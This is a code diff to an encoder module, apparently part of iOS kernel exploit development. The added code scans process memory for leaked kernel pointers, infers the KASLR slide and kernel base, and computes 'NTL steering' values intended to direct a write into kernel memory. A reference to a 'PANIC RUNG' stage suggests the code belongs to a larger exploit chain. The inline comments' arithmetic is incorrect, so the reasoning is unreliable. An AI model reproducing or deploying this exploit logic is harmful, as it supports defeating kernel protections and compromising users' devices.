@@ -3,6 +3,7 @@
 #import "KPLog.h"
 #import <VideoToolbox/VideoToolbox.h>
 #import <CoreMedia/CoreMedia.h>
+#import <mach/mach.h>
 
 @interface KPH9EncoderModule ()
 @property (nonatomic, copy) NSString *identifier;
@@ -212,6 +213,85 @@
         }
         VTCompressionSessionCompleteFrames(s3, kCMTimeInvalid);
         CFRelease(s3);
+    }
+
+    // === KASLR scan ===
+    [report appendString:@"\n--- KASLR scan ---\n"];
+    uint64_t kStaticBases[] = {
+        0xfffffff007004000ULL, // __TEXT
+        0xfffffff007804000ULL, // __TEXT_EXEC
+        0xfffffff007e00000ULL, // __DATA
+    };
+    uint32_t slideCandidates[64] = {0};
+    int slideCounts[64] = {0};
+    int candidateCount = 0;
+    int totalKptrs = 0;
+    vm_address_t kaddr = 0;
+    vm_size_t ksize = 0;
+    uint32_t kdepth = 0;
+    vm_region_submap_info_data_64_t kinfo;
+    mach_msg_type_number_t kcount = VM_REGION_SUBMAP_INFO_COUNT_64;
+    for (int iter = 0; iter < 256; iter++) {
+        kern_return_t kr = vm_region_recurse_64(mach_task_self(), &kaddr, &ksize, &kdepth,
+                                                 (vm_region_recurse_info_t)&kinfo, &kcount);
+        if (kr != KERN_SUCCESS) break;
+        if ((kinfo.protection & VM_PROT_READ) && (kinfo.protection & VM_PROT_WRITE)) {
+            uint64_t *p = (uint64_t *)kaddr;
+            size_t words = ksize / 8;
+            for (size_t i = 0; i < words && i < 4096; i++) {
+                uint64_t v = *(p + i);
+                if (v >= 0xfffffff007004000ULL && v < 0xfffffffffffff000ULL) {
+                    totalKptrs++;
+                    for (int b = 0; b < 3; b++) {
+                        uint64_t slide = v - kStaticBases[b];
+                        if ((slide & 0x3FFF) == 0 && slide < (1024ULL << 20)) {
+                            int found = 0;
+                            for (int c = 0; c < candidateCount; c++) {
+                                if (slideCandidates[c] == (uint32_t)slide) {
+                                    slideCounts[c]++;
+                                    found = 1;
+                                    break;
+                                }
+                            }
+                            if (!found && candidateCount < 64) {
+                                slideCandidates[candidateCount] = (uint32_t)slide;
+                                slideCounts[candidateCount] = 1;
+                                candidateCount++;
+                            }
+                        }
+                    }
+                }
+            }
+        }
+        kaddr += ksize;
+        kcount = VM_REGION_SUBMAP_INFO_COUNT_64;
+    }
+    [report appendFormat:@"  kernel pointers: %d\n", totalKptrs];
+    int bestIdx = -1, bestCnt = 0;
+    for (int c = 0; c < candidateCount; c++) {
+        if (slideCounts[c] > bestCnt) { bestCnt = slideCounts[c]; bestIdx = c; }
+    }
+    if (bestIdx >= 0) {
+        uint32_t slide = slideCandidates[bestIdx];
+        uint64_t kbase = 0xfffffff007004000ULL + slide;
+        [report appendFormat:@"  KASLR slide = 0x%x (hits=%d)\n", slide, bestCnt];
+        [report appendFormat:@"  Kernel base = 0x%llx\n", kbase];
+
+        // Compute NTL values that steer write into kernel range
+        [report appendString:@"\n--- NTL steering (kernel range writes) ---\n"];
+        [report appendString:@"x0 = ((NTL-16463) << 32) | 0x59\n"];
+        // NTL=1 -> x0 = 0xfffffff000000059
+        // NTL=16447 -> x0 = 0xfffffff000000059 (same!)
+        // Actually: ((1-16463)<<32)|0x59 = ((-16462)<<32)|0x59 = 0xFFFFFFF000000059
+        //           ((16447-16463)<<32)|0x59 = ((-16)<<32)|0x59 = 0xFFFFFFF000000059
+        // Both give same address! Need NTL values that give DIFFERENT high bits.
+        int steerVals[] = { 1, 2, 3, 100, 1000, 8000, 16000, 16447, 16455, 16462 };
+        for (int i = 0; i < 10; i++) {
+            int ntl = steerVals[i];
+            int64_t idx = (int64_t)ntl - 16463;
+            uint64_t x0 = ((uint64_t)idx << 32) | 0x59;
+            [report appendFormat:@"  NTL=%-5d -> x0=0x%016llx\n", ntl, x0];
+        }
     }
 
     // === AVE27 stage9: PANIC RUNG (NTL=16463) ===
